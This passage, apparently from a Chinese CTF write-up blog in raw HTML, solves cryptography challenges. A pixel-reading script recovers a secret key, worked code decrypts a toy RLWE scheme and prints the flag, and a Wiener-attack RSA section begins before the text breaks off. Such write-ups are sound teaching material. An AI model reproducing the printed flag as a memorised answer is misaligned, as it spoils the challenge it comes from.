class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;YOUQU/s.png&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        tmp = img.getpixel((i,j))</span><br><span class="line">        s.append(tmp)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = [1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1]</span></span><br></pre></td></tr></table></figure><p>加密部分是一个RLWE，定义了一个多项式商环 $F_p[x]=\cfrac{Z_p[x]}{f(x)}$，随机列表为商环上的多项式系数列表。</p><p>加密函数 </p><p>$t(x) \equiv -s(x)g(x)+e_1(x) \pmod p$</p><p>$w(x) \equiv t(x)r(x)+e_2(x)+d\cdot m(x) \pmod p$</p><p>$v(x) \equiv g(x)r(x)+e_3(x) \pmod p$</p><p>已知私钥 $s(x)$，则</p><p>$w+s\cdot v=(t\cdot r+e_2+d\cdot m)+s(g\cdot r+e_3)=-s\cdot g\cdot r+e_1\cdot r+e_2+d\cdot m+s\cdot g\cdot r+s\cdot e_3=d\cdot m+(e_1\cdot r+e_2+s\cdot e_3)$</p><p>可以发现，后面的 $e\cdot r+e_2+s\cdot e_3$ 仍然是个小噪声， 有</p><p>$(w+s\cdot v) \bmod d = m$</p><p>噪声可能满足 $e_1\cdot r+e_2+s\cdot e_3&lt;0$ ，为负值的时候，会出现 $(w+s\cdot v) \bmod d = m&lt;1$ ，需对应处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> poly</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polymul(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polyadd(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, <span class="number">2</span>, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qz</span>(<span class="params">z, lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, z, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.random.normal(<span class="number">0</span>, <span class="number">2</span>, size=lenth1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jlkey</span>(<span class="params">lenth1, z, mod</span>):</span><br><span class="line">    s = q2(lenth1)</span><br><span class="line">    g = qz(z, lenth1)</span><br><span class="line">    e1 = guess(lenth1)</span><br><span class="line">    t = add(mul(g, s, z, mod), e1, z, mod)</span><br><span class="line">    key = [g, t, s]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jl</span>(<span class="params">key, length1, n, p, mod, msg</span>):</span><br><span class="line">    jlm = []</span><br><span class="line">    mm = <span class="built_in">hex</span>(msg)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mm)):</span><br><span class="line">        jlm.append(<span class="built_in">ord</span>(mm[i]))</span><br><span class="line"></span><br><span class="line">    m = np.array(jlm + [<span class="number">0</span>] * (length1 - <span class="built_in">len</span>(jlm)), dtype=np.int64) % p</span><br><span class="line">    d = n // p</span><br><span class="line">    dm = d * m % n</span><br><span class="line">    e2 = guess(length1)</span><br><span class="line">    e3 = guess(length1)</span><br><span class="line">    r = q2(length1)</span><br><span class="line">    g = key[<span class="number">0</span>]</span><br><span class="line">    t = key[<span class="number">1</span>]</span><br><span class="line">    w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod)</span><br><span class="line">    v = add(mul(g, r, n, mod), e3, n, mod)</span><br><span class="line">    c = [w, v]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">o = <span class="number">128</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">62</span></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (o - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">w = [<span class="number">4456121292753321984</span>, <span class="number">2695388220323384832</span>, <span class="number">1125798304404134912</span>, <span class="number">1389165333028469760</span>, <span class="number">3720515311443086336</span>, <span class="number">1806160162087117824</span>, <span class="number">1710165564223285248</span>, <span class="number">3854525633894178816</span>, <span class="number">4160032803226148864</span>, <span class="number">3223993978734964736</span>, <span class="number">188029029972998144</span>, <span class="number">2283288149728718848</span>, <span class="number">178098730553155584</span>, <span class="number">400166020473782272</span>, <span class="number">4426677526375129088</span>, <span class="number">1768526165797007360</span>, <span class="number">4596103848246980608</span>, <span class="number">3143341953117548544</span>, <span class="number">4113813229295153152</span>, <span class="number">1444787342796136448</span>, <span class="number">1749143783191330816</span>, <span class="number">601663717837410304</span>, <span class="number">1976180375223943168</span>, <span class="number">899486064067571712</span>, <span class="number">2467702122158211072</span>, <span class="number">1442313048691163136</span>, <span class="number">2977506408218411008</span>, <span class="number">1106991111199326208</span>, <span class="number">844904722420957184</span>, <span class="number">1013497211561496576</span>, <span class="number">4250614525386129408</span>, <span class="number">1677797764964532224</span>, <span class="number">4212901529405988864</span>, <span class="number">2561734724771299328</span>, <span class="number">1890807629146202112</span>, <span class="number">951039123411230720</span>, <span class="number">881428262835757056</span>, <span class="number">514344970914586624</span>, <span class="number">3072465238399721472</span>, <span class="number">1294633561516974080</span>, <span class="number">4471068621313253376</span>, <span class="number">2978038764905480192</span>, <span class="number">1256294011046658048</span>, <span class="number">2885789906784919552</span>, <span class="number">1808546586690191360</span>, <span class="number">3846883621647482880</span>, <span class="number">422980376119787520</span>, <span class="number">3401510714240147456</span>, <span class="number">3024926897503240192</span>, <span class="number">3504641379026477056</span>, <span class="number">2686993749796929536</span>, <span class="number">4084804987293286400</span>, <span class="number">1949654215988994048</span>, <span class="number">2949577339713200128</span>, <span class="number">2514172581835300864</span>, <span class="number">614361226066452480</span>, <span class="number">1560522408220647424</span>, <span class="number">1215782736092413952</span>, <span class="number">1705607337158410240</span>, <span class="number">3789095360729792512</span>, <span class="number">126768310879952896</span>, <span class="number">3564560282876477440</span>, <span class="number">4112635401656336384</span>, <span class="number">488963213586022400</span>, <span class="number">3263989278014881792</span>, <span class="number">1190526290525741056</span>, <span class="number">3726804923972673536</span>, <span class="number">2773020963465314304</span>, <span class="number">2008550394681090048</span>, <span class="number">2877753734522249216</span>, <span class="number">3318721688589254656</span>, <span class="number">2685195110085615616</span>, <span class="number">2120287225013829632</span>, <span class="number">2837075008393977856</span>, <span class="number">680647261446750208</span>, <span class="number">2672034759831756800</span>, <span class="number">586790221783564288</span>, <span class="number">4413791420559310848</span>, <span class="number">753748175057453056</span>, <span class="number">4156435215025135616</span>, <span class="number">1753634903657668608</span>, <span class="number">3868573500772638720</span>, <span class="number">1065381465124585472</span>, <span class="number">1951729611177713664</span>, <span class="number">833463289401663488</span>, <span class="number">3083559584672243712</span>, <span class="number">2453364017450852352</span>, <span class="number">3187954181254758400</span>, <span class="number">2701962603281113088</span>, <span class="number">1657135743981748224</span>, <span class="number">3393942972234113024</span>, <span class="number">3224375546132267008</span>, <span class="number">1637663670848045056</span>, <span class="number">2226464092285288448</span>, <span class="number">3426678970486587392</span>, <span class="number">3746864906767974400</span>, <span class="number">892187878069846016</span>, <span class="number">1566105953383768064</span>, <span class="number">1841796609436766208</span>, <span class="number">102854404605427712</span>, <span class="number">1384852880673484800</span>, <span class="number">2187150610629812224</span>, <span class="number">3960839367218393088</span>, <span class="number">798293770690805760</span>, <span class="number">172119736121323520</span>, <span class="number">2434320282093170688</span>, <span class="number">3398926147058458624</span>, <span class="number">858963714965422080</span>, <span class="number">3371154991043334144</span>, <span class="number">1537312801335345152</span>, <span class="number">2963315646558453760</span>, <span class="number">4058550201296797696</span>, <span class="number">1544831164568528896</span>, <span class="number">4296983781331357696</span>, <span class="number">3597399236973740032</span>, <span class="number">1172234645379473408</span>, <span class="number">1811007296491237376</span>, <span class="number">1364782914640955392</span>, <span class="number">1942828798540959744</span>, <span class="number">1312644494190576640</span>, <span class="number">540671172853423104</span>, <span class="number">2521681537802540032</span>, <span class="number">3678999552996606976</span>, <span class="number">3522586936321518592</span>, <span class="number">3355286245326997504</span>, <span class="number">1724989423167225856</span>, <span class="number">2857616461138001920</span>, <span class="number">3550411157752463360</span>]</span><br><span class="line">v = [<span class="number">3004075223514152960</span>, <span class="number">375766571298967040</span>, <span class="number">3918175633582001664</span>, <span class="number">298998053399571840</span>, <span class="number">4539733962165100544</span>, <span class="number">3415675319003214848</span>, <span class="number">557497174827461120</span>, <span class="number">1187181217327680512</span>, <span class="number">42761045408950272</span>, <span class="number">4539692406094923776</span>, <span class="number">3474777010512353280</span>, <span class="number">807990709249906688</span>, <span class="number">4401927180657766400</span>, <span class="number">628439373724332032</span>, <span class="number">3552565694197467136</span>, <span class="number">1229559664627433472</span>, <span class="number">2735485480783970304</span>, <span class="number">340251515454152704</span>, <span class="number">535029869298274304</span>, <span class="number">1089634905489248256</span>, <span class="number">1745435675342262272</span>, <span class="number">2211405319829864448</span>, <span class="number">3166387633265565696</span>, <span class="number">3356595592575791104</span>, <span class="number">811586262403354624</span>, <span class="number">1658544963444764672</span>, <span class="number">2801381922146680832</span>, <span class="number">1906405005677551616</span>, <span class="number">2764661089781948416</span>, <span class="number">348852661152833536</span>, <span class="number">2843732326950182912</span>, <span class="number">3655220640882900992</span>, <span class="number">2735228541582770176</span>, <span class="number">984245520265568256</span>, <span class="number">847631674608009216</span>, <span class="number">4278557074339209216</span>, <span class="number">354445030770749440</span>, <span class="number">552426514839019520</span>, <span class="number">3037890003690143744</span>, <span class="number">3845527152479436800</span>, <span class="number">686613871844605952</span>, <span class="number">1987014853275738112</span>, <span class="number">129221415412514816</span>, <span class="number">884028654840045568</span>, <span class="number">893161048767537152</span>, <span class="number">4428861422755028992</span>, <span class="number">1977654893495033856</span>, <span class="number">2683055322869915648</span>, <span class="number">4466344498597339136</span>, <span class="number">2820131774980661248</span>, <span class="number">2105607478169853952</span>, <span class="number">768444766180638720</span>, <span class="number">212987987936600064</span>, <span class="number">1576117523911901184</span>, <span class="number">1650389830627762176</span>, <span class="number">1915750840791851008</span>, <span class="number">4109009172913405952</span>, <span class="number">2218053892260061184</span>, <span class="number">3863963349465956352</span>, <span class="number">2990430210085863424</span>, <span class="number">1274030477779271680</span>, <span class="number">1711547929466978304</span>, <span class="number">1157679433574768640</span>, <span class="number">156097645996949504</span>, <span class="number">3695677787747401728</span>, <span class="number">4322888783310766080</span>, <span class="number">4546024412016992256</span>, <span class="number">2655974462028947456</span>, <span class="number">1604656974594400256</span>, <span class="number">2045021548923273216</span>, <span class="number">3161689730583207936</span>, <span class="number">8339332591755263</span>, <span class="number">2341948229963612160</span>, <span class="number">3607706207127453696</span>, <span class="number">469234496887414784</span>, <span class="number">973715854261501952</span>, <span class="number">789210633607102464</span>, <span class="number">4424949506055979008</span>, <span class="number">1542517731370860544</span>, <span class="number">182468406585786368</span>, <span class="number">1807090988320792576</span>, <span class="number">1850374377172516864</span>, <span class="number">2618527682038956032</span>, <span class="number">1262867559425187840</span>, <span class="number">938222240300924928</span>, <span class="number">4591256432328728576</span>, <span class="number">2044671823654682624</span>, <span class="number">3467964150293766144</span>, <span class="number">79543117595951104</span>, <span class="number">2185630104198291456</span>, <span class="number">3728244444110430208</span>, <span class="number">156056289984327680</span>, <span class="number">4390349499275018240</span>, <span class="number">1751182369256157184</span>, <span class="number">2162985531302232064</span>, <span class="number">2761554017168584704</span>, <span class="number">2829764058526203904</span>, <span class="number">2028689816016191488</span>, <span class="number">146286463995781120</span>, <span class="number">3720834471976288256</span>, <span class="number">2917463735459491840</span>, <span class="number">4566476477728677888</span>, <span class="number">3722002688823242752</span>, <span class="number">4245856959119122432</span>, <span class="number">3425954365963665408</span>, <span class="number">3618936531494342656</span>, <span class="number">3695636186696466432</span>, <span class="number">1423352273706041344</span>, <span class="number">158921080583421952</span>, <span class="number">4351926341975711744</span>, <span class="number">3376292832678187008</span>, <span class="number">3295795181429579776</span>, <span class="number">3267875754319810560</span>, <span class="number">2363850527793784832</span>, <span class="number">888488262224822272</span>, <span class="number">1097387081646508032</span>, <span class="number">3686827109357189120</span>, <span class="number">297511993689784320</span>, <span class="number">3698586652027076608</span>, <span class="number">1126524981060736000</span>, <span class="number">1227462499250052096</span>, <span class="number">195965752955788032</span>, <span class="number">378621325977167872</span>, <span class="number">4568860371418834944</span>, <span class="number">3806982850127191040</span>, <span class="number">2330191690590402560</span>, <span class="number">965690431040995328</span>, <span class="number">2254601344237207552</span>]</span><br><span class="line">g = [<span class="number">1271385667288255999</span>, <span class="number">3597939031086288160</span>, <span class="number">948720385886874982</span>, <span class="number">3730034896312885091</span>, <span class="number">155961058571645646</span>, <span class="number">873298702409407364</span>, <span class="number">3695415802847080551</span>, <span class="number">3935805697420664465</span>, <span class="number">303427777773526115</span>, <span class="number">2121504102169723388</span>, <span class="number">3117842710535023914</span>, <span class="number">2004730725267082784</span>, <span class="number">315298886702225235</span>, <span class="number">711790101004272712</span>, <span class="number">3469726824196756845</span>, <span class="number">3649946521480214795</span>, <span class="number">4269586158067475466</span>, <span class="number">1607685984041888423</span>, <span class="number">1866766258134518609</span>, <span class="number">4115571819844332380</span>, <span class="number">2381299916655519619</span>, <span class="number">2208948036365614734</span>, <span class="number">1946214530009282102</span>, <span class="number">330799912617809735</span>, <span class="number">3460498231343524429</span>, <span class="number">2694359423578749492</span>, <span class="number">793704330311549271</span>, <span class="number">1491532600134534859</span>, <span class="number">1606672420502700650</span>, <span class="number">561106526228105342</span>, <span class="number">1105025457886824442</span>, <span class="number">1443932433209975334</span>, <span class="number">4240908184445005305</span>, <span class="number">1954646486670721382</span>, <span class="number">4227369777555389059</span>, <span class="number">1563814260527576306</span>, <span class="number">771217858163031033</span>, <span class="number">1280424786084049063</span>, <span class="number">303853418224126180</span>, <span class="number">181918673882271714</span>, <span class="number">2212581027220765469</span>, <span class="number">2111888312694611250</span>, <span class="number">3581354821166105988</span>, <span class="number">1429049683930421764</span>, <span class="number">1357441041735699015</span>, <span class="number">3553280165847887597</span>, <span class="number">869489768651033960</span>, <span class="number">1107714765447012644</span>, <span class="number">2910143081602408601</span>, <span class="number">1433461290183315706</span>, <span class="number">3240132019514117541</span>, <span class="number">2465292834002904411</span>, <span class="number">1334470694725903257</span>, <span class="number">3156578894981065904</span>, <span class="number">35185442949043438</span>, <span class="number">645993467993501426</span>, <span class="number">1352915688916657829</span>, <span class="number">1521946784078789166</span>, <span class="number">2639858512187877401</span>, <span class="number">4315064694485922395</span>, <span class="number">3953315792354490874</span>, <span class="number">1587769214913102261</span>, <span class="number">3912000075342935904</span>, <span class="number">1887499577531299413</span>, <span class="number">309657057763429254</span>, <span class="number">769590223035802807</span>, <span class="number">4361036733963754384</span>, <span class="number">1446528785602732156</span>, <span class="number">1205711736426995533</span>, <span class="number">3683188791797133788</span>, <span class="number">921287773622604679</span>, <span class="number">3591274357626650529</span>, <span class="number">2745859155549230842</span>, <span class="number">4491978210538609848</span>, <span class="number">2444128709624329128</span>, <span class="number">1403888264551474491</span>, <span class="number">4377727165055311964</span>, <span class="number">1507498290240201527</span>, <span class="number">2952796830041690744</span>, <span class="number">1642562262970195060</span>, <span class="number">2847743992975447391</span>, <span class="number">4164239208310834247</span>, <span class="number">1967003682977431435</span>, <span class="number">2575799088251274004</span>, <span class="number">156708464748056204</span>, <span class="number">2403917842083313594</span>, <span class="number">55721043545237639</span>, <span class="number">239916744182811448</span>, <span class="number">134638877854791156</span>, <span class="number">76687455444928683</span>, <span class="number">3051612621194354938</span>, <span class="number">4253947515818696559</span>, <span class="number">392166402534779315</span>, <span class="number">5415521347314633</span>, <span class="number">1816697745794261287</span>, <span class="number">2282876916808180261</span>, <span class="number">3667412627019328976</span>, <span class="number">4211876289328416715</span>, <span class="number">1647128252024708114</span>, <span class="number">3721877072126461741</span>, <span class="number">2297068963395433648</span>, <span class="number">398583411660274597</span>, <span class="number">3562855580894975650</span>, <span class="number">1322989240042277117</span>, <span class="number">3551729861626536144</span>, <span class="number">2816759739903316271</span>, <span class="number">2629395545611893101</span>, <span class="number">1799561289667084873</span>, <span class="number">2629410111371391637</span>, <span class="number">1398369600901640698</span>, <span class="number">447266788926484707</span>, <span class="number">405213767544537836</span>, <span class="number">3014220918160576578</span>, <span class="number">747208265285548041</span>, <span class="number">1727187447678753569</span>, <span class="number">3063564852472463780</span>, <span class="number">1502638600503176791</span>, <span class="number">3284205888928186113</span>, <span class="number">3412854446691461073</span>, <span class="number">3937011809364193960</span>, <span class="number">1208514509487198642</span>, <span class="number">3063044796627572289</span>, <span class="number">2532417142719581087</span>, <span class="number">375928502591586817</span>, <span class="number">2839325684818922862</span>, <span class="number">4472409225244809142</span>, <span class="number">1384186637673587546</span>, <span class="number">1680318030162086049</span>]</span><br><span class="line">t = [<span class="number">3482937270284373504</span>, <span class="number">3729542463939501056</span>, <span class="number">1354530592839269376</span>, <span class="number">2340035975483411456</span>, <span class="number">3318144666530505728</span>, <span class="number">4321971466042776576</span>, <span class="number">4107840020098758656</span>, <span class="number">2600042509314867200</span>, <span class="number">3185315495632337920</span>, <span class="number">2510425761632839680</span>, <span class="number">3758844697217568768</span>, <span class="number">1813627045100445696</span>, <span class="number">1035634427310004224</span>, <span class="number">1650895865179787264</span>, <span class="number">931858574122051584</span>, <span class="number">3821738968282525696</span>, <span class="number">751354306590687232</span>, <span class="number">812159733109825536</span>, <span class="number">1984846083975063552</span>, <span class="number">426674528748978176</span>, <span class="number">1786129270688538624</span>, <span class="number">53204613942820864</span>, <span class="number">4207648582990901248</span>, <span class="number">2441413890227052544</span>, <span class="number">4573249524143439872</span>, <span class="number">2901255116891488256</span>, <span class="number">3331287389413953536</span>, <span class="number">1594453621617430528</span>, <span class="number">7636565623463936</span>, <span class="number">3261865719383670784</span>, <span class="number">3211543945355886592</span>, <span class="number">4414864510393499648</span>, <span class="number">1781787468450406400</span>, <span class="number">4381257290165919744</span>, <span class="number">1683943310183464960</span>, <span class="number">1618102318685454336</span>, <span class="number">3082727664554508288</span>, <span class="number">1284750602156802048</span>, <span class="number">4536273674447527936</span>, <span class="number">4224428964375134208</span>, <span class="number">1990811212107251712</span>, <span class="number">220641709431201792</span>, <span class="number">56727929599156224</span>, <span class="number">1394394833783595008</span>, <span class="number">474539825790402560</span>, <span class="number">2367070412709519360</span>, <span class="number">86013256530493440</span>, <span class="number">3983263247386468352</span>, <span class="number">4488230536002330624</span>, <span class="number">1131832099054157824</span>, <span class="number">4470326732790874112</span>, <span class="number">2361104703887433728</span>, <span class="number">1850267988673478656</span>, <span class="number">519014833878171648</span>, <span class="number">2447115942472581120</span>, <span class="number">2567048274520276992</span>, <span class="number">3409815404144214016</span>, <span class="number">2569012418791473152</span>, <span class="number">2239861171203006464</span>, <span class="number">3207035079062069248</span>, <span class="number">1423032481934245888</span>, <span class="number">3660676895628648448</span>, <span class="number">3197924030326439936</span>, <span class="number">2173721402472767488</span>, <span class="number">1836499846562930688</span>, <span class="number">1193190307175825408</span>, <span class="number">2757965850888388608</span>, <span class="number">3833547905923039232</span>, <span class="number">113362523505639424</span>, <span class="number">2095507640221974528</span>, <span class="number">695818728283136000</span>, <span class="number">2746136108677742592</span>, <span class="number">80271849461956608</span>, <span class="number">544596706215608320</span>, <span class="number">857894362373431296</span>, <span class="number">1801819582386577408</span>, <span class="number">2748888436946362368</span>, <span class="number">1760827740054806528</span>, <span class="number">2544591920627023872</span>, <span class="number">4324861829346312192</span>, <span class="number">3073160513540464640</span>, <span class="number">3260750497480876032</span>, <span class="number">1268136159796920320</span>, <span class="number">2738758060057362432</span>, <span class="number">460370852221685760</span>, <span class="number">3694812482865025024</span>, <span class="number">674485732026892288</span>, <span class="number">31827325234905088</span>, <span class="number">1076067066569760768</span>, <span class="number">3538749128687951872</span>, <span class="number">4553745898606747648</span>, <span class="number">3332219178735149056</span>, <span class="number">329835532944998400</span>, <span class="number">4576690061027602432</span>, <span class="number">3023286444576161792</span>, <span class="number">1797946474203955200</span>, <span class="number">4558389623053447168</span>, <span class="number">1790588264296259584</span>, <span class="number">3017170271014150144</span>, <span class="number">991463616551034880</span>, <span class="number">1940023178234544128</span>, <span class="number">3414390445152993280</span>, <span class="number">644333657859764224</span>, <span class="number">3692106158122917888</span>, <span class="number">3167684436092710912</span>, <span class="number">789204772426006528</span>, <span class="number">4353661356398166016</span>, <span class="number">2000540208800374784</span>, <span class="number">3942168043465134080</span>, <span class="number">3332450567729246208</span>, <span class="number">2627875622523490304</span>, <span class="number">9371534919516160</span>, <span class="number">848644069081235456</span>, <span class="number">2192689498702295040</span>, <span class="number">907016265148577792</span>, <span class="number">2645935549696630784</span>, <span class="number">2590866188404383744</span>, <span class="number">3750676748846913536</span>, <span class="number">3694849270404139008</span>, <span class="number">4268369840164233216</span>, <span class="number">3556945000413347840</span>, <span class="number">1995615102316576768</span>, <span class="number">4445424004994387968</span>, <span class="number">2929133498761163776</span>, <span class="number">2462149674675616768</span>, <span class="number">741748174115656704</span>, <span class="number">39754566828455680</span>, <span class="number">4477497218304360448</span>]</span><br><span class="line">s = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">x = [(n-k)%n <span class="keyword">for</span> k <span class="keyword">in</span> v]</span><br><span class="line">res = add(w,mul(s,x,n,mod),n,mod)</span><br><span class="line"></span><br><span class="line">t1 = (res//(<span class="number">2</span>**<span class="number">30</span>))[:<span class="number">76</span>]</span><br><span class="line">t2 = (res%(<span class="number">2</span>**<span class="number">30</span>))[:<span class="number">76</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t1)):</span><br><span class="line">    <span class="keyword">if</span> t2[i] &gt; <span class="number">1000000</span>:</span><br><span class="line">        c += <span class="built_in">chr</span>(t1[i]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c += <span class="built_in">chr</span>(t1[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(c,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HSCCTF&#123;vb6fh8gd7fy87jht7fgyt7g89gb9dn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RSATEST"><a href="#RSATEST" class="headerlink" title="RSATEST"></a>RSATEST</h3><p>给了公钥文件和密文，在线解析公钥得到 $n,e$，wiener attack求 $d$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 